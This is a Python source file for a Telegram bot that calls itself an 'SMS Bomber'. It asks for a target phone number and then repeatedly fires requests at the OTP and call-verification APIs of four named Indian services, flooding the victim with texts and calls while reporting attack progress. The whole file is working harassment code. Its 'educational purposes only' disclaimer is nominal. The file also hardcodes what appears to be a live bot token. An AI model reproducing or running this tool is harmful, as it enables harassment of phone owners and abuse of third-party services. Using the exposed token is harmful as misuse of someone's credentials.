import requests
import random
import logging
import threading
import asyncio
from time import sleep
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)
from telegram.error import BadRequest

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot Token from BotFather
TOKEN = "7554221154:AAF6slUuJGJ7tXuIDhEZP8LIOB5trSTz0gU"

# Global variables
active_attacks = {}
stop_events = {}
message_count = {}  # To track total messages sent

# List of working APIs (removed non-working ones)
APIS = [
    {
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "payload": {"mobile": ""},
        "headers": {"Content-Type": "application/json"},
        "name": "Swiggy"
    },
    {
        "url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
        "payload": {"contactNumber": "", "domainId": "2"},
        "headers": {"Content-Type": "application/json"},
        "name": "Proptiger"
    },
    {
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "payload": {"isPlaycircle": False, "mobile": "", "deviceId": "6ebd671c-a5f7-4baa-904b-89d4f898ee79", "deviceName": "", "refCode": ""},
        "headers": {"Content-Type": "application/json"},
        "name": "RummyCircle"
    },
    {
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "payload": {"isPlaycircle": False, "mobile": "", "deviceId": "03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1", "deviceName": "", "refCode": ""},
        "headers": {"Content-Type": "application/json"},
        "name": "My11Circle"
    }
]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a beautiful message when the command /start is issued."""
    user = update.effective_user
    welcome_msg = f"""
🌟 *Welcome to SMS Bomber Bot* 🌟

Hey {user.mention_markdown_v2()}\\! 

🚀 *Features:*
- Send multiple SMS to a target number
- Uses {len(APIS)} working APIs
- Stop functionality with /stop command

⚠️ *Disclaimer:*
This bot is for *educational purposes only*\\. Misuse may violate terms of service\\.

📌 *How to use:*
1\\. Click 'Start Attack' button
2\\. Send the target phone number when asked
3\\. Use /stop to end the attack
    """
    
    keyboard = [
        [InlineKeyboardButton("⚡ Start Attack", callback_data='start_attack')],
        [InlineKeyboardButton("ℹ️ Help", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        await update.message.reply_markdown_v2(welcome_msg, reply_markup=reply_markup)
    except BadRequest:
        await update.message.reply_text("Welcome to SMS Bomber Bot! Click the buttons below to get started.", reply_markup=reply_markup)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send help message."""
    help_text = """
📖 *Help Guide*

🔹 To start an attack:
1\\. Click 'Start Attack' button
2\\. Send the 10-digit phone number when asked

🔹 To stop an attack:
Send /stop command

🔹 Current Features:
- Multiple API support
- Message counter
- Stop functionality

⚠️ Use responsibly\\!
    """
    try:
        await update.message.reply_markdown_v2(help_text)
    except BadRequest:
        await update.message.reply_text("""
Help Guide

To start an attack:
1. Click 'Start Attack' button
2. Send the 10-digit phone number when asked

To stop an attack:
Send /stop command

Current Features:
- Multiple API support
- Message counter
- Stop functionality

Use responsibly!
        """)

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button presses."""
    query = update.callback_query
    await query.answer()

    if query.data == 'start_attack':
        await query.edit_message_text(text="🔢 Please send the target 10-digit phone number now (e.g., 9876543210)")
        context.user_data['expecting_number'] = True
    elif query.data == 'help':
        await help_command(update, context)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle incoming messages."""
    if 'expecting_number' in context.user_data and context.user_data['expecting_number']:
        phone_number = update.message.text.strip()
        
        if not phone_number.isdigit() or len(phone_number) != 10:
            await update.message.reply_text("❌ Invalid phone number. Please provide a 10-digit number.")
            return
        
        context.user_data['expecting_number'] = False
        await start_attack(update, context, phone_number)

async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str) -> None:
    """Start the SMS attack."""
    user_id = update.effective_user.id
    
    if user_id in active_attacks:
        await update.message.reply_text("⚠️ You already have an active attack. Use /stop to stop it first.")
        return
    
    stop_event = threading.Event()
    stop_events[user_id] = stop_event
    message_count[user_id] = 0  # Initialize message counter
    
    # Create and start attack thread
    attack_thread = threading.Thread(
        target=run_attack,
        args=(update, context, phone_number, stop_event)
    )
    attack_thread.start()
    
    active_attacks[user_id] = attack_thread
    
    # Show working APIs
    api_list = "\n".join([f"• {api['name']}" for api in APIS])
    await update.message.reply_text(
        f"🚀 Attack started on {phone_number}!\n\n"
        f"📡 Working APIs:\n{api_list}\n\n"
        f"🛑 Use /stop to end the attack."
    )

def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str, stop_event: threading.Event) -> None:
    """Run the attack in a separate thread."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    user_id = update.effective_user.id
    
    while not stop_event.is_set():
        try:
            # Send to all APIs simultaneously using threads
            threads = []
            results = []
            
            for api in APIS:
                thread = threading.Thread(
                    target=send_single_request,
                    args=(api, phone_number, results)
                )
                thread.start()
                threads.append(thread)
            
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
            
            # Update message count
            success_count = sum(1 for r in results if r['success'])
            message_count[user_id] += success_count
            
            # Create progress bar
            total_attempts = message_count[user_id]
            progress = min(100, total_attempts // 2)  # Cap at 100%
            progress_bar = "🟩" * progress + "⬜" * (100 - progress)
            
            # Send summary
            summary = (
                f"📊 Attack Status for {phone_number}:\n"
                f"✅ Successful: {success_count} this round\n"
                f"📨 Total Sent: {message_count[user_id]}\n"
                f"📈 Progress: {progress}%\n{progress_bar}\n"
                f"🔄 Next round in 35 seconds..."
            )
            
            loop.run_until_complete(
                context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=summary
                )
            )
            
            # Wait 35 seconds or until stopped
            for _ in range(35):
                if stop_event.is_set():
                    return
                sleep(1)
                
        except Exception as e:
            logger.error(f"Error in attack thread: {e}")
            if not stop_event.is_set():
                loop.run_until_complete(
                    context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"⚠️ Error in attack: {str(e)}"
                    )
                )
            break

def send_single_request(api: dict, phone_number: str, results: list) -> None:
    """Send a single API request."""
    try:
        # Prepare payload
        payload = api["payload"].copy()
        for key in payload:
            if "mobile" in key.lower() or "phone" in key.lower() or "number" in key.lower() or "contact" in key.lower():
                payload[key] = phone_number
        
        # Send request
        response = requests.post(
            api["url"],
            json=payload,
            headers=api.get("headers", {}),
            timeout=10
        )
        
        results.append({
            "url": api['url'],
            "name": api['name'],
            "success": response.status_code == 200,
            "status": response.status_code
        })
    except Exception as e:
        results.append({
            "url": api['url'],
            "name": api['name'],
            "success": False,
            "error": str(e)
        })

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Stop the active attack."""
    user_id = update.effective_user.id
    
    if user_id not in active_attacks:
        await update.message.reply_text("ℹ️ You don't have any active attacks to stop.")
        return
    
    # Signal the thread to stop
    stop_events[user_id].set()
    
    # Wait for thread to finish (with timeout)
    active_attacks[user_id].join(timeout=5)
    
    # Get final count
    total_sent = message_count.get(user_id, 0)
    
    # Clean up
    del active_attacks[user_id]
    del stop_events[user_id]
    del message_count[user_id]
    
    await update.message.reply_text(
        f"🛑 Attack stopped successfully!\n"
        f"📨 Total messages sent: {total_sent}"
    )

def main() -> None:
    """Start the bot."""
    # Create the Application and pass it your bot's token.
    application = Application.builder().token(TOKEN).build()

    # Register handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Add error handler
    application.add_error_handler(error_handler)

    # Run the bot until the user presses Ctrl-C
    application.run_polling(allowed_updates=Update.ALL_TYPES)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log errors caused by updates."""
    logger.error(msg="Exception while handling an update:", exc_info=context.error)
    
    if update and isinstance(update, Update):
        try:
            await update.message.reply_text("⚠️ An error occurred. Please try again.")
        except:
            try:
                await update.callback_query.message.reply_text("⚠️ An error occurred. Please try again.")
            except:
                pass

if __name__ == '__main__':
    main()
